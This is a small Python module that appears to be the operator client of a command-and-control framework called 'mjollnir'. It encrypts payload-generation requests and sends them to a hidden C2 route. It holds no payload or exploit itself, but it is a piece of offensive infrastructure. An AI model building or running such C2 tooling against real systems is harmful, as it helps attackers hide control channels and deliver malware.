import json
import misc
import termtables as tt
import binascii

class Payload():
	def __init__(self, config, session, misc):
		self.config = config
		self.s = session
		self.misc = misc

	def generate_payload(self, payload_name, payload_param):
		# POST mjollnir/hidden_route/payload
		url = self.config["mjollnir_c2_url"] + self.config["hidden_route"]
		endpoint = self.config["endpoints"]["payload"]
		data = payload_param
		data["payload_name"] = payload_name

		data = json.dumps(data)

		data = self.misc.encrypt(data)
		r = self.s.post(url+endpoint, data=data)
		if r.status_code == 200:
			print(self.misc.decrypt(r.content))
			return True
		else:
			print("[-] Cannot generate the payload")
			return False

	



